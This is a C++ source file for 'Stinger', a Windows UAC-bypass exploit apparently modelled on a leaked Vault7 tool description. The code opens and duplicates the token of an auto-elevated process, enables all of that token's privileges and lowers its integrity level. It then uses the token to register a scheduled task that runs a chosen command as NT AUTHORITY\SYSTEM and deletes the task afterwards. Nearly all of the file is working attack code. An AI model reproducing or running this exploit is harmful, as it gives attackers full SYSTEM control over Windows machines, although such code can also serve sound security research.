/*
 * Filename: Stinger.cpp
 *
 * Classification:
 * Classified By:
 *
 * Tool Name: Stinger
 * Requirement #:2024-1337
 *
 * Author: Hacker Fantastic
 * Date Created:        12/31/2023
 * Version 1.0:01/01/2024 (00:00)
 *
 * The Vault7 wiki contains references to privilate escalation modules
 * used by the AED. This is an implementation of "Stinger" which is a
 * "UAC bypass that obtains the token from an auto-elevated process, 
 * modifies it, and reuses it to execute as administrator". It is possible
 * for a UAC restricted process to read a privileged token from a binary
 * that runs with autoelevate. This exploit opens a token, duplicates it,
 * lowers the integrity level and then leverages it with a COM object to
 * create a scheduled task from a privileged thread and launch a SYSTEM
 * shell directly from a UAC restricted process. 
 *
 *
 */
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <winternl.h>
#include <AclAPI.h>
#include <taskschd.h>
#include <comdef.h>
#include <iostream>
#include <string>

// Linked libraries
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

// function prototypes
DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam);
void DebugPrivileges(HANDLE token);
void PrintAccessRights(DWORD accessRights);
void PrintDacl(PACL dacl);
void PrintSecurityContext(HANDLE token = NULL);
void TokenAllTheThings(HANDLE hToken);
void ManipulateTokenIntegrity(HANDLE hToken);

// typedef's and struct
typedef NTSTATUS(NTAPI* NtSetInformationToken_t)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG);

struct ThreadParams {
	std::string executable;
	std::string arguments;
	HANDLE token;
};

// Lower a token's integrity level, necessary when impersonating from a medium IL with a high IL token.
void ManipulateTokenIntegrity(HANDLE hToken) {
	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
	std::cout << "Dropping IL..." << std::endl;
	if (!hNtDll) {
		std::cout << "Failed to get handle to ntdll.dll\n";
		return;
	}
	NtSetInformationToken_t NtSetInformationToken = (NtSetInformationToken_t)GetProcAddress(hNtDll, "NtSetInformationToken");
	if (!NtSetInformationToken) {
		std::cout << "Failed to get function addresses\n";
		return;
	}
	// get a medium integrity SID
	SID_IDENTIFIER_AUTHORITY sia = SECURITY_MANDATORY_LABEL_AUTHORITY;
	PSID pSID;
	if (!AllocateAndInitializeSid(&sia, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &pSID)) {
		std::cout << "Failed to initialize SID!\n";
		return;
	}
	std::cout << "Initialized medium IL SID\n";
	// lower our token integrity level
	TOKEN_MANDATORY_LABEL tml = { 0 };
	tml.Label.Attributes = SE_GROUP_INTEGRITY;
	tml.Label.Sid = pSID;
	if (NtSetInformationToken(hToken, TokenIntegrityLevel, &tml, sizeof(tml)) == 0) {
		std::cout << "Token lowered to medium integrity\n";
	}
	else {
		std::cout << "Failed to modify token!\n";
		return;
	}
}

// Change our security context, do something privileged. You can put your payload here that
// will run with the autoelevated privileged token. Bypass UAC. As we have an Administrator
// token, this uses COM and ITaskService to create a scheduled task and launch it as SYSTEM.
DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam) {
	ThreadParams* tp = static_cast<ThreadParams*>(lpParam);
	std::string executable = tp->executable;
	std::string arguments = tp->arguments;
	HANDLE token = tp->token;
	// COM init
	std::cout << "COM init..." << std::endl;
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		std::cout << "CoInitializeEx failed. Error: " << hr << std::endl;
		return 1;
	}
	std::cout << "Attemping to bypass UAC with the token..." << std::endl;
	if (!ImpersonateLoggedOnUser(token))
	{
		std::cerr << "ImpersonateLoggedOnUser failed with error: " << GetLastError() << std::endl;
		return 1;
	}
	std::cout << "ImpersonateLoggedOnUser succeeded.. " << std::endl;
	PrintSecurityContext();
	/* // Launch a shell on the desktop
	STARTUPINFOW si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPCWSTR username = L"HackerMarvelous";
	LPCWSTR domain = L".";
	LPCWSTR password = L"";
	DWORD bufferLength = MAX_PATH + 1;
	WCHAR currentDirectory[MAX_PATH + 1];
	if (!GetCurrentDirectory(bufferLength, currentDirectory)) {
		std::cout << "GetCurrentDirectory failed. Error: " << GetLastError() << "\n";
		return 1;
	}
	if (!CreateProcessWithLogonW(username, domain, password, LOGON_NETCREDENTIALS_ONLY, wCommand, NULL, CREATE_UNICODE_ENVIRONMENT, NULL, currentDirectory, &si, &pi)) {
		std::cout << "CreateProcessWithLogonW failed. Error: " << GetLastError() << "\n";
	}
	else {
		std::cout << "CreateProcessWithLognW success!" << std::endl;
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}*/
	std::cout << "Attemping to run command as NT AUTHORITY\\SYSTEM via COM..." << std::endl;
	ITaskService* pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	if (FAILED(hr)) {
		std::cout << "Failed to create an instance of ITaskService. Error: " << hr << std::endl;
		CoUninitialize();
		return 1;
	}
	std::cout << "Created ITaskService.." << std::endl;
	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr)) {
		if (hr == HRESULT_FROM_WIN32(ERROR_ACCESS_DENIED)) {
			std::cout << "Access denied. Please run this program as an administrator." << std::endl;
		}
		else {
			std::cout << "ITaskService::Connect failed. Error: " << hr << std::endl;
		}
		pService->Release();
		CoUninitialize();
		return 1;
	}
	std::cout << "Connected to ITaskService.." << std::endl;
	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr)) {
		std::cout << "ITaskService::GetFolder failed. Error: " << hr << std::endl;
		pService->Release();
		CoUninitialize();
		return 1;
	}
	ITaskDefinition* pTask = NULL;
	hr = pService->NewTask(0, &pTask);
	if (FAILED(hr)) {
		std::cout << "ITaskService::NewTask failed. Error: " << hr << std::endl;
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	IRegistrationInfo* pRegInfo = NULL;
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr)) {
		std::cout << "ITaskDefinition::get_RegistrationInfo failed. Error: " << hr << std::endl;
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	hr = pRegInfo->put_Author(_bstr_t(L"User"));
	if (FAILED(hr)) {
		std::cout << "IRegistrationInfo::put_Author failed. Error: " << hr << std::endl;
		pRegInfo->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	if (pRegInfo != NULL) {
		pRegInfo->Release();
		pRegInfo = NULL;
	}
	IPrincipal* pPrincipal = NULL;
	hr = pTask->get_Principal(&pPrincipal);
	if (FAILED(hr)) {
		std::cout << "ITaskDefinition::get_Principal failed. Error: " << hr << std::endl;
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	hr = pPrincipal->put_Id(_bstr_t(L"Principal1"));
	if (FAILED(hr)) {
		std::cout << "IPrincipal::put_Id failed. Error: " << hr << std::endl;
		pPrincipal->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	hr = pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
	if (FAILED(hr)) {
		std::cout << "IPrincipal::put_LogonType failed. Error: " << hr << std::endl;
		pPrincipal->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
	if (FAILED(hr)) {
		std::cout << "IPrincipal::put_RunLevel failed. Error: " << hr << std::endl;
		pPrincipal->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	if (pPrincipal != NULL) {
		pPrincipal->Release();
		pPrincipal = NULL;
	}
	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr)) {
		std::cout << "ITaskDefinition::get_Triggers failed. Error: " << hr << std::endl;
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	ITrigger* pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
	if (FAILED(hr)) {
		std::cout << "ITriggerCollection::Create failed. Error: " << hr << std::endl;
		pTriggerCollection->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	if (pTriggerCollection != NULL) {
		pTriggerCollection->Release();
		pTriggerCollection = NULL;
	}
	ITimeTrigger* pTimeTrigger = NULL;
	hr = pTrigger->QueryInterface(IID_ITimeTrigger, (void**)&pTimeTrigger);
	if (FAILED(hr)) {
		std::cout << "ITrigger::QueryInterface failed. Error: " << hr << std::endl;
		pTrigger->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	if (pTrigger != NULL) {
		pTrigger->Release();
		pTrigger = NULL;
	}
	SYSTEMTIME st;
	GetSystemTime(&st);
	st.wMinute += 1; // Add one minute
	WCHAR wzTime[64];
	swprintf_s(wzTime, L"%04d-%02d-%02dT%02d:%02d:%02d",
		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
	hr = pTimeTrigger->put_StartBoundary(_bstr_t(wzTime));
	if (FAILED(hr)) {
		std::cout << "ITimeTrigger::put_StartBoundary failed. Error: " << hr << std::endl;
		pTimeTrigger->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	IActionCollection* pActionCollection = NULL;
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr)) {
		std::cout << "ITaskDefinition::get_Actions failed. Error: " << hr << std::endl;
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	IAction* pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	if (FAILED(hr)) {
		std::cout << "IActionCollection::Create failed. Error: " << hr << std::endl;
		pActionCollection->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	if (pActionCollection != NULL) {
		pActionCollection->Release();
		pActionCollection = NULL;
	}
	IExecAction* pExecAction = NULL;
	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	if (FAILED(hr)) {
		std::cout << "IAction::QueryInterface failed. Error: " << hr << std::endl;
		pAction->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	if (pAction != NULL) {
		pAction->Release();
		pAction = NULL;
	}
	hr = pExecAction->put_Path(_bstr_t(executable.c_str()));
	if (SUCCEEDED(hr)) {
		hr = pExecAction->put_Arguments(_bstr_t(arguments.c_str()));
	}
	if (FAILED(hr)) {
		std::cout << "IExecAction::put_Path failed. Error: " << hr << std::endl;
		pExecAction->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	if (pExecAction != NULL) {
		pExecAction->Release();
		pExecAction = NULL;
	}
	std::cout << "Registering the evil Task.." << std::endl;
	IRegisteredTask* pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(_bstr_t(L"MyTask"), pTask, TASK_CREATE_OR_UPDATE, _variant_t(L"SYSTEM"), _variant_t(), TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L""), &pRegisteredTask);
	if (FAILED(hr)) {
		std::cout << "ITaskFolder::RegisterTaskDefinition failed. Error: " << hr << std::endl;
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	std::cout << "Task created successfully." << std::endl;
	IRunningTask* pRunningTask = NULL;
	hr = pRegisteredTask->Run(_variant_t(), &pRunningTask);
	if (FAILED(hr)) {
		std::cout << "IRegisteredTask::Run failed. Error: " << hr << std::endl;
		pRegisteredTask->Release();
		pTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	if (pRegisteredTask != NULL) {
		pRegisteredTask->Release();
		pRegisteredTask = NULL;
	}
	std::cout << "Executed command as NT AUTHORITY\\SYSTEM... wait for cleanup" << std::endl;
	Sleep(3000); // Wait for 3 seconds.
	hr = pRootFolder->GetTask(_bstr_t(L"MyTask"), &pRegisteredTask);
	if (SUCCEEDED(hr)) {
		hr = pRootFolder->DeleteTask(_bstr_t(L"MyTask"), 0);
		if (FAILED(hr)) {
			std::cout << "ITaskFolder::DeleteTask failed. Error: " << hr << std::endl;
		}
		else {
			std::cout << "Task deleted successfully." << std::endl;
		}
	}
	if (pRegisteredTask != NULL) {
		pRegisteredTask->Release();
		pRegisteredTask = NULL;
	}
	if (pRunningTask != NULL) {
		pRunningTask->Release();
		pRunningTask = NULL;
	}
	if (pTask != NULL) {
		pTask->Release();
		pTask = NULL;
	}
	if (pRootFolder != NULL) {
		pRootFolder->Release();
		pRootFolder = NULL;
	}
	if (pService != NULL) {
		pService->Release();
		pService = NULL;
	}
	CoUninitialize();
	RevertToSelf();
	return 0;
}

// Enable all the privileges available in a token.
void TokenAllTheThings(HANDLE hToken)
{
	DWORD dwSize = 0;
	PTOKEN_PRIVILEGES tp = NULL;
	std::cout << "H4x0r1nG the token ..." << std::endl;
	if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			std::cerr << "GetTokenInformation failed with error: " << GetLastError() << '\n';
			return;
		}
	}
	tp = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
	if (!tp)
	{
		std::cerr << "HeapAlloc failed with error: " << GetLastError() << '\n';
		return;
	}
	if (!GetTokenInformation(hToken, TokenPrivileges, tp, dwSize, &dwSize))
	{
		std::cerr << "GetTokenInformation failed with error: " << GetLastError() << '\n';
		HeapFree(GetProcessHeap(), 0, tp);
		return;
	}
	for (DWORD i = 0; i < tp->PrivilegeCount; ++i)
	{
		LUID_AND_ATTRIBUTES& la = tp->Privileges[i];
		la.Attributes |= SE_PRIVILEGE_ENABLED;
		TCHAR szPrivName[256];
		DWORD dwNameLen = sizeof(szPrivName) / sizeof(TCHAR);
		if (LookupPrivilegeName(NULL, &la.Luid, szPrivName, &dwNameLen))
		{
			std::wcout << L"Enabling privilege: " << szPrivName << '\n';
		}
		else
		{
			std::cerr << "LookupPrivilegeName failed with error: " << GetLastError() << '\n';
		}
	}
	if (!AdjustTokenPrivileges(hToken, FALSE, tp, dwSize, NULL, NULL))
	{
		std::cerr << "AdjustTokenPrivileges failed with error: " << GetLastError() << '\n';
	}
	HeapFree(GetProcessHeap(), 0, tp);
}

// Show all the privileges in a token and the status.
void DebugPrivileges(HANDLE token) {
	DWORD len = 0;
	std::cout << "Dumping token privileges..." << std::endl;
	GetTokenInformation(token, TokenPrivileges, NULL, 0, &len);
	PTOKEN_PRIVILEGES privileges = (PTOKEN_PRIVILEGES)malloc(len);
	if (GetTokenInformation(token, TokenPrivileges, privileges, len, &len)) {
		for (DWORD i = 0; i < privileges->PrivilegeCount; ++i) {
			LUID_AND_ATTRIBUTES laa = privileges->Privileges[i];
			TCHAR name[256];
			DWORD nameLen = 256;
			if (LookupPrivilegeName(NULL, &laa.Luid, name, &nameLen)) {
				if (laa.Attributes & SE_PRIVILEGE_ENABLED) {
					std::wcout << L"[+] Enabled Privilege: " << name << " Attributes : " << laa.Attributes << std::endl;
				}
				else {
					std::wcout << L"[-] Disabled Privilege: " << name << " Attributes : " << laa.Attributes << std::endl;
				}
				if (laa.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
					std::wcout << L"    This privilege is enabled by default." << std::endl;
				}
				if (laa.Attributes & SE_PRIVILEGE_REMOVED) {
					std::wcout << L"    This privilege was removed from the token." << std::endl;
				}
				if (laa.Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) {
					std::wcout << L"    The privilege was used to access an object or service." << std::endl;
				}
			}
		}
	}
	free(privileges);
}

// Check DACL access rights
void PrintAccessRights(DWORD accessRights) {
	if (accessRights & GENERIC_READ) {
		std::cout << "GENERIC_READ ";
	}
	if (accessRights & GENERIC_WRITE) {
		std::cout << "GENERIC_WRITE ";
	}
	if (accessRights & GENERIC_EXECUTE) {
		std::cout << "GENERIC_EXECUTE ";
	}
	if (accessRights & GENERIC_ALL) {
		std::cout << "GENERIC_ALL ";
	}
	// Add more access rights checks as needed
	std::cout << std::endl;
}

// Get the DACL of a token, check the SID's and it's access rights.
void PrintDacl(PACL dacl) {
	std::cout << "Checking token DACL..." << std::endl;
	if (dacl == NULL) {
		std::cout << "DACL is NULL" << std::endl;
		return;
	}
	ACL_SIZE_INFORMATION aclSizeInfo;
	if (!GetAclInformation(dacl, &aclSizeInfo, sizeof(aclSizeInfo), AclSizeInformation)) {
		std::cout << "GetAclInformation failed: " << GetLastError() << std::endl;
		return;
	}
	for (DWORD i = 0; i < aclSizeInfo.AceCount; ++i) {
		LPVOID ace;
		if (!GetAce(dacl, i, &ace)) {
			std::cout << "GetAce failed: " << GetLastError() << std::endl;
			return;
		}
		ACE_HEADER* aceHeader = (ACE_HEADER*)ace;
		PSID sid;
		if (aceHeader->AceType == ACCESS_ALLOWED_ACE_TYPE) {
			ACCESS_ALLOWED_ACE* allowedAce = (ACCESS_ALLOWED_ACE*)ace;
			sid = &(allowedAce->SidStart);
			std::cout << "Allowed ACE: ";
			PrintAccessRights(allowedAce->Mask);
		}
		else if (aceHeader->AceType == ACCESS_DENIED_ACE_TYPE) {
			ACCESS_DENIED_ACE* deniedAce = (ACCESS_DENIED_ACE*)ace;
			sid = &(deniedAce->SidStart);
			std::cout << "Denied ACE: ";
			PrintAccessRights(deniedAce->Mask);
		}
		else {
			std::cout << "Unknown ACE type: " << aceHeader->AceType << std::endl;
			continue;
		}
		wchar_t accountName[1024];
		DWORD accountNameLen = sizeof(accountName) / sizeof(wchar_t);
		wchar_t domainName[1024];
		DWORD domainNameLen = sizeof(domainName) / sizeof(wchar_t);
		SID_NAME_USE sidType;
		if (LookupAccountSid(NULL, sid, accountName, &accountNameLen, domainName, &domainNameLen, &sidType)) {
			std::wcout << L"Account: " << domainName << L"\\" << accountName << std::endl;
		}
		else {
			std::cout << "LookupAccountSid failed: " << GetLastError() << std::endl;
		}
		LPWSTR stringSid;
		if (ConvertSidToStringSid(sid, &stringSid)) {
			std::wcout << L"SID: " << stringSid << std::endl;
			LocalFree(stringSid);
		}
		else {
			std::cout << "ConvertSidToStringSid failed: " << GetLastError() << std::endl;
		}
	}
}

// Takes a token as argument and prints security context. If no token provided
// checks the current thread token, if no thread token, gets the process token.
// Under impersonation you have the main process token and then the thread token
// which is used in the impersonation. From MSDN, token can be used for impersonation 
// when one of the following is true.
// 
// 1. The requested impersonation level of the token is less than SecurityImpersonation, 
// such as SecurityIdentification or SecurityAnonymous.
// 2. The caller has the SeImpersonatePrivilege privilege.
// 3. A process(or another process in the caller's logon session) created the token using 
// explicit credentials through LogonUser or LsaLogonUser function.
// 4. The authenticated identity is same as the caller.
//
// Undocumented that tokens cannot be used for impersonation across integrity levels.
void PrintSecurityContext(HANDLE token) {
	BOOL result;
	DWORD bufferSize = 0;
	PTOKEN_USER userToken = NULL;
	PTOKEN_DEFAULT_DACL daclToken = NULL;
	if (token == NULL) {
		result = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &token);
		if (!result) {
			if (GetLastError() == ERROR_NO_TOKEN) {
				result = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);
				if (!result) {
					std::cout << "OpenProcessToken failed: " << GetLastError() << std::endl;
					return;
				}
			}
			else {
				std::cout << "OpenThreadToken failed: " << GetLastError() << std::endl;
				return;
			}
		}
	}
	if (token == (HANDLE)-1) {
		result = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);
		if (!result) {
			std::cout << "OpenProcessToken failed: " << GetLastError() << std::endl;
			return;
		}
	}
	GetTokenInformation(token, TokenUser, NULL, 0, &bufferSize);
	userToken = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
	if (GetTokenInformation(token, TokenUser, userToken, bufferSize, &bufferSize)) {
		if (GetTokenInformation(token, TokenUser, userToken, bufferSize, &bufferSize)) {
			WCHAR domainName[MAX_PATH];
			DWORD domainNameLen = MAX_PATH;
			SID_NAME_USE sidType;
			WCHAR userName[MAX_PATH];
			DWORD userNameLen = MAX_PATH;
			if (LookupAccountSid(NULL, userToken->User.Sid, userName, &userNameLen, domainName, &domainNameLen, &sidType)) {
				std::wcout << L"User: " << userName << L"\nDomain: " << domainName << std::endl;
			}
			else {
				std::cout << "LookupAccountSid failed: " << GetLastError() << std::endl;
			}
			LPWSTR szSID = NULL;
			if (!ConvertSidToStringSid(userToken->User.Sid, &szSID))
			{
				std::cerr << "ConvertSidToStringSid failed with error: " << GetLastError() << '\n';
				return;
			}
			std::wcout << L"User SID: " << szSID << '\n';
			LocalFree(szSID);
		}
	}
	else {
		std::cout << "GetTokenInformation failed: " << GetLastError() << std::endl;
	}
	bufferSize = 0;
	GetTokenInformation(token, TokenDefaultDacl, NULL, 0, &bufferSize);
	daclToken = (PTOKEN_DEFAULT_DACL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
	if (GetTokenInformation(token, TokenDefaultDacl, daclToken, bufferSize, &bufferSize)) {
		PrintDacl(daclToken->DefaultDacl);
	}
	else {
		std::cout << "GetTokenInformation failed: " << GetLastError() << std::endl;
	}
	if (userToken) {
		HeapFree(GetProcessHeap(), 0, userToken);
	}
	if (daclToken) {
		HeapFree(GetProcessHeap(), 0, daclToken);
	}
	BOOL isElevated = FALSE;
	TOKEN_ELEVATION elevation;
	DWORD cbSize = sizeof(TOKEN_ELEVATION);
	if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
		isElevated = elevation.TokenIsElevated;
	}
	if (!isElevated) {
		std::cout << "Token is not elevated." << std::endl;
	}
	else {
		std::cout << "Token is elevated!" << std::endl;
	}
	if (IsTokenRestricted(token)) {
		std::cout << "Token is restricted." << std::endl;
	}
	else {
		std::cout << "Token is not restricted" << std::endl;
	}
	DebugPrivileges(token);
}

// The main exploit routine. Runs an autoelevate binary (e.g. taskmgr.exe) using ShellExecuteEx,
// which returns a process handle (even on Windows 11!) to a high IL elevated process from a
// non-elevated process. You can then read the process token through its handle, duplicate it
// to make changes, lower its IL and use it from a privileged thread. 
int main(int argc, char* argv[]) {
	if (argc < 3) {
		std::cout << "Usage: " << argv[0] << " <autoelevate.exe> <command.exe> <arg1> <arg2> <arg3>" << std::endl;
		return 1;
	}
	std::cout << "Show our process security context..." << std::endl;
	PrintSecurityContext();;
	size_t size = strlen(argv[1]) + 1;
	wchar_t* wAutoElevate = new wchar_t[size];
	size_t outSize;
	mbstowcs_s(&outSize, wAutoElevate, size, argv[1], size - 1);
	std::string executable = argv[2];
	std::string arguments;
	for (int i = 3; i < argc; ++i) {
		arguments += argv[i];
		if (i < argc - 1) {
			arguments += " ";
		}
	}
	SHELLEXECUTEINFO shExInfo = { 0 };
	shExInfo.cbSize = sizeof(shExInfo);
	shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	shExInfo.hwnd = 0;
	shExInfo.lpVerb = L"runas";
	shExInfo.lpFile = wAutoElevate;
	shExInfo.lpParameters = L"";
	shExInfo.lpDirectory = 0;
	shExInfo.nShow = SW_SHOW;
	shExInfo.hInstApp = 0;
	if (ShellExecuteEx(&shExInfo)) {
		HANDLE hToken;
		DWORD processId = GetProcessId(shExInfo.hProcess);
		if (processId == 0) {
			DWORD error = GetLastError();
			std::cerr << "GetProcessId failed with error: " << error << std::endl;
			return -1;
		}
		std::cout << "Process ID: " << processId << std::endl;
		if (OpenProcessToken(shExInfo.hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
			HANDLE hDupToken;
			// Token has everyone DACL! Danger!
			SECURITY_ATTRIBUTES sa;
			LPCWSTR sddl = L"D:P(A;;GA;;;WD)";
			sa.nLength = sizeof(sa);
			sa.bInheritHandle = FALSE;
			if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
			{
				std::cerr << "ConvertStringSecurityDescriptorToSecurityDescriptor failed. Error: " << GetLastError() << std::endl;
				CloseHandle(hToken);
				return -1;
			}
			if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDupToken)) {
				std::cout << "Successfully duplicated token" << std::endl;
				TokenAllTheThings(hDupToken);
				ManipulateTokenIntegrity(hDupToken);
				ThreadParams tp;
				tp.token = hDupToken;
				tp.executable = executable;
				tp.arguments = arguments;
				DWORD threadId;
				HANDLE hThread = CreateThread(NULL, 0, TestPrivilegedOperations, &tp, 0, &threadId);
				if (hThread == NULL) {
					std::cerr << "CreateThread failed. Error: " << GetLastError() << std::endl;
					return -1;
				}
				else {
					WaitForSingleObject(hThread, INFINITE);
					CloseHandle(hThread);
					CloseHandle(hDupToken);
					CloseHandle(hToken);
				}
			}
			else {
				std::cout << "Failed to duplicate token: " << GetLastError() << std::endl;
				CloseHandle(hToken);
			}
		}
		else {
			std::cout << "Failed to open process token: " << GetLastError() << std::endl;
		}
	}
	else {
		std::cout << "ShellExecuteEx failed: " << GetLastError() << std::endl;
	}
	delete[] wAutoElevate;
	return 0;
}